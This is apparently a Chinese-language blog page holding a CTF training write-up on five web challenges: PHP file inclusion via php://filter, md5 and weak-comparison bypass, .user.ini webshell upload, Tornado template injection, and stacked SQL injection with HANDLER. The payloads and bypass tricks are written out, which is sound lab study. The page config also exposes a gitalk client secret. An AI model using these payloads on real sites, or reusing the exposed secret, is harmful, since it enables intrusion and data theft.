@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Latte">
+    
+    <title>
+        
+            集训WriteUp-3 |
+        
+        Latte&#39;s
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"ohvy.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Latte's","author":"Latte","avatar":"/images/cat.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","tools":"/tools","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Latte and Americano.","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/ohvy","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":"shiwwang@163.com"}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":false},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":"ohvy","github_admins":null,"repository":"gitalk","client_id":"Ov23liQm7PTQpK5JLa0h","client_secret":"ba0525d7d59a301a09ac76ed9299df6ceb9a42a5","proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2022,"word_count":false,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{"tools":[{"category":"聊天 AI"},{"name":"ChatGPT","link":"https://chat.openai.com/","description":"OpenAI 旗下 AI 聊天对话工具","image":"/images/tools/chatgpt.svg"},{"name":"Gemini","link":"https://gemini.google.com/app","description":"Google 旗下 AI 聊天对话工具","image":"/images/tools/gemini.svg"},{"category":"待开发"}]},"version":"4.1.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Latte&#39;s
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                
+                                分类
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tools"
+                            >
+                                
+                                工具
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories"
+                    >分类</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tools"
+                    >工具</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        集训WriteUp-3
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/cat.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Latte</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2023-01-28 09:19:27</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Mon May 06 2024 20:45:37 GMT+0800">2024-05-06 20:45:37</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Write-Up/">Write Up</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/CTF/">CTF</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/web/">web</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <p>2023-01-28 WP</p>
+<h1 id="T1-ACTF2020-新生赛-Include"><a href="#T1-ACTF2020-新生赛-Include" class="headerlink" title="T1 [ACTF2020 新生赛]Include"></a>T1 [ACTF2020 新生赛]Include</h1><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include" >题目地址<i class="fas fa-external-link-alt"></i></a></p>
+<p>点击<code>tips</code>跳转，url为<code>http://6d3271bd-e229-4cb6-8d9f-14c45ac78c60.node4.buuoj.cn:81/?file=flag.php</code>，应该是一个文件包含漏洞，不能直接读出flag，用PHP伪协议访问其源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=文件名</span><br></pre></td></tr></table></figure>
+
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>得到flag.php源码的base64编码，解码后找到flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NjU5ZGFmNzUtMjUxOS00MDZhLWI2ZjUtNGI5ZWUzOWZmZDQ3fQo=</span><br><span class="line">解码结果:</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">//flag&#123;659daf75-2519-406a-b6f5-4b9ee39ffd47&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46467017/article/details/126380415" >文件包含漏洞详解<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>2023-02-01 WP</p>
+<h1 id="T2-MRCTF2020-Ez-bypass"><a href="#T2-MRCTF2020-Ez-bypass" class="headerlink" title="T2 [MRCTF2020]Ez_bypass"></a>T2 [MRCTF2020]Ez_bypass</h1><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[MRCTF2020]Ez_bypass" >题目地址<i class="fas fa-external-link-alt"></i></a></p>
+<p>考点：md5()碰撞，PHP弱类型比较</p>
+<p>给出源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd==1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>
+
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>要求<code>$id</code>与<code>$gg</code>的md5值相同，而本身值不同。这一点可以利用<strong>md5()无法处理数组，如果传入的两个参数都是数组，那么md5()函数返回的都是false</strong>来实现。</p>
+<p>接下来需要绕过<code>is_numeric()</code>传入<code>$passwd</code>，并与<code>1234567</code>进行弱类型比较。根据PHP弱类型比较的特性，<code>&#39;1234567a&#39; == &#39;1234567&#39;</code>，从而同时绕过了<code>is_numeric()</code>函数。</p>
+<blockquote>
+<p>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串或null，则转换为0（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）</p>
+</blockquote>
+<h2 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">?gg[]=1&amp;&amp;id[]=2</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">passwd=1234567a</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/99709333" >https://blog.csdn.net/u014029795/article/details/99709333<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>2023-02-01 WP</p>
+<h1 id="T3-SUCTF-2019-CheckIn"><a href="#T3-SUCTF-2019-CheckIn" class="headerlink" title="T3 [SUCTF 2019]CheckIn"></a>T3 [SUCTF 2019]CheckIn</h1><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn" >题目地址<i class="fas fa-external-link-alt"></i></a></p>
+<p>传马试一试：</p>
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2023/01/28/%E9%9B%86%E8%AE%ADWriteUp-3/3-1.png"
+                        class="" title="普通传马"
+                 >
+
+<p>回显”illegal suffix!”，需要改后缀。</p>
+<blockquote>
+<p><code>illegal suffix</code>:不能上传后缀为php、php4、php5、phtml等可直接被解析的PHP文件</p>
+</blockquote>
+<p>我们改为’webshell.jpg’再次尝试一下，结果回显”&lt;?  in contents!”，用<code>script</code>过滤一下：</p>
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2023/01/28/%E9%9B%86%E8%AE%ADWriteUp-3/3-2.png"
+                        class="" title="图片传马"
+                 >
+
+<p>提示我们”exif_imagetype:not image!”，可尝试用<code>GIF89a</code>文件头欺骗的方式绕过</p>
+<blockquote>
+<p><code>exif_imagetype</code>:表示判断一个图片的类型（即读取一个图像的第一个字节并检查其签名）</p>
+</blockquote>
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2023/01/28/%E9%9B%86%E8%AE%ADWriteUp-3/3-3.png"
+                        class="" title="高级传马"
+                 >
+
+<p>可以看到，上传成功，且告知我们上传路径”uploads&#x2F;c47b21fcf8f0bc8b3920541abd8024fd”。下一步考虑将其解析为php文件，先用上传<code>.htaccess</code>配置文件的办法将.jpg后缀的文件当作php文件解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.htaccess（同样加上GIF89a文件头）</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">Addtype application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>然而这样不行，可能是没有开放<code>AllowOverride  All</code>，尝试其他办法。</p>
+<blockquote>
+<p>AllowOverride  All    # 启动.htaccess文件的使用</p>
+</blockquote>
+<h2 id="一些关于user-ini的知识"><a href="#一些关于user-ini的知识" class="headerlink" title="一些关于user.ini的知识"></a>一些关于user.ini的知识</h2><p><code>.user.ini</code>比<code>.htaccess</code>用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。</p>
+<p>PHP配置项中有两个比较有意思的项（下图第一、四个）：</p>
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2023/01/28/%E9%9B%86%E8%AE%ADWriteUp-3/3-4.png"
+                        class="" title="配置项"
+                 >
+
+<p>其中的<code>auto_prepend_file</code>表示指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。使用方法很简单，直接写在.user.ini中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=webshell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>从而可以借助.user.ini轻松让所有php文件都“自动”包含某个文件（这里即’webshell.jpg’），而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell. 当然，前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。</p>
+<p>这里恰好满足条件，我们上传<code>.user.ini</code>文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=webshell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>然后上传一个图片马<code>webshell.jpg</code>，用蚁剑连接”uploads&#x2F;c47b21fcf8f0bc8b3920541abd8024fd&#x2F;index.php”即可。</p>
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" >user.ini文件构成的PHP后门<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>2023-02-02 WP</p>
+<h1 id="T4-护网杯-2018-easy-tornado"><a href="#T4-护网杯-2018-easy-tornado" class="headerlink" title="T4 [护网杯 2018]easy_tornado"></a>T4 [护网杯 2018]easy_tornado</h1><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado" >题目地址<i class="fas fa-external-link-alt"></i></a></p>
+<p>考点：服务器模板注入（SSTI），Tornado 是使用 Python 开发的全栈式（full-stack）Web 框架和异步网络库。与以前提到过的 Flask 一样都是 Python 的一种 Web 开发框架。Tornado render 是 Python 中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对 render 内容可控，不仅可以注入 XSS 代码，而且还可以通过 <code>&#123;&#123;&#125;&#125;</code> 进行传递变量和执行简单的表达式。</p>
+<p>三个文件，用GET方式访问，如flag.txt : “file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;27bc54e1e85bcd53729ca9fc2c325cc7”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line"></span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line"></span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+
+<p>不传参访问”file”会来到Error页面<code>error?msg=Error</code>，修改msg参数为<code>&#123;&#123;1&#125;&#125;</code>，发现存在SSTI漏洞</p>
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2023/01/28/%E9%9B%86%E8%AE%ADWriteUp-3/4-1.png"
+                        class="" title="SSTI"
+                 >
+
+<p>如果要访问<code>/fllllllllllllag</code>，势必要先弄清楚它的filehash是什么，&#x2F;hints.txt提示我们可能是<code>cookie_secret+md5(filename)</code>的md5值，那么下一步要找的就是<code>cookie_secret</code>的值。</p>
+<blockquote>
+<p>cookie_secret 是存在于 settings 中的，settings 又作为参数传入了 Application 构造函数，因此可以通过 self.application.settings 来获取到 cookie_secret。又因为根据官方文档， RequestHandler.settings 的别名是 self.application.settings，且 handler 指向处理当前这个页面的 RequestHandler 对象，故最终的效果就是可以直接通过 handler.settings 来得到 cookie_secret 的值。</p>
+</blockquote>
+<h2 id="获取cookie-secret"><a href="#获取cookie-secret" class="headerlink" title="获取cookie_secret"></a>获取cookie_secret</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img  
+                       lazyload
+                       alt="image"
+                       data-src="/2023/01/28/%E9%9B%86%E8%AE%ADWriteUp-3/4-2.png"
+                        class="" title="SSTI"
+                 >
+
+<h2 id="计算md5"><a href="#计算md5" class="headerlink" title="计算md5"></a>计算md5</h2><p>计算md5值即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">cookie=&#x27;f7119331-0e70-4070-b8b5-e72a76fd878f&#x27;</span><br><span class="line">filename=&#x27;/fllllllllllllag&#x27;</span><br><span class="line">md5_filename=hashlib.md5(filename.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()</span><br><span class="line">word=cookie+md5_filename</span><br><span class="line">flag=hashlib.md5(word.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">## 303175bc3fca5948d03a5f9688fbde51</span><br></pre></td></tr></table></figure>
+
+<h2 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=303175bc3fca5948d03a5f9688fbde51</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45805420/article/details/107876871#:~:text=Tornado%20render%20%E6%98%AF%20Python%20%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AA%E6%B8%B2%E6%9F%93%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%B8%80%E7%A7%8D%E6%A8%A1%E6%9D%BF%EF%BC%8C%E9%80%9A%E8%BF%87%E8%B0%83%E7%94%A8%E7%9A%84%E5%8F%82%E6%95%B0%E4%B8%8D%E5%90%8C%EF%BC%8C%E7%94%9F%E6%88%90%E4%B8%8D%E5%90%8C%E7%9A%84%E7%BD%91%E9%A1%B5%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%94%A8%E6%88%B7%E5%AF%B9%20render,%E5%86%85%E5%AE%B9%E5%8F%AF%E6%8E%A7%EF%BC%8C%E4%B8%8D%E4%BB%85%E5%8F%AF%E4%BB%A5%E6%B3%A8%E5%85%A5%20XSS%20%E4%BB%A3%E7%A0%81%EF%BC%8C%E8%80%8C%E4%B8%94%E8%BF%98%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%20%7B%20%7B%7D%7D%20%E8%BF%9B%E8%A1%8C%E4%BC%A0%E9%80%92%E5%8F%98%E9%87%8F%E5%92%8C%E6%89%A7%E8%A1%8C%E7%AE%80%E5%8D%95%E7%9A%84%E8%A1%A8%E8%BE%BE%E5%BC%8F%E3%80%82" >XCTF系列 &#x2F;&#x2F; Web | easytornado<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>2023-02-02 WP</p>
+<h1 id="T5-GYCTF2020-Blacklist"><a href="#T5-GYCTF2020-Blacklist" class="headerlink" title="T5 [GYCTF2020]Blacklist"></a>T5 [GYCTF2020]Blacklist</h1><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GYCTF2020]Blacklist" >题目地址<i class="fas fa-external-link-alt"></i></a></p>
+<p>与 [强网杯 2019]随便注 很类似，无法用联合查询，选择堆叠注入。不同点在于这里<code>alter</code>等修改表名的命令和<code>PREPARE</code>预处理命令也被过滤了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+
+<p>先查表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables;#</span><br></pre></td></tr></table></figure>
+
+<p>得到”FlagHere”和”words”两个表，能否直接依靠&#x2F;**&#x2F;绕过检查呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;sel/**/ect flag from `FlagHere`;#</span><br></pre></td></tr></table></figure>
+
+<p>结果是啥也没有。</p>
+<p>学习一种新的操作 HANDLER :</p>
+<blockquote>
+<p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
+</blockquote>
+<p>下面是一个用例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>
+
+<p>于是修改Payload</p>
+<h2 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62092622/article/details/124272307" >-眼里有星河- [GYCTF2020]Blacklist<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>2023-02-03 WP</p>
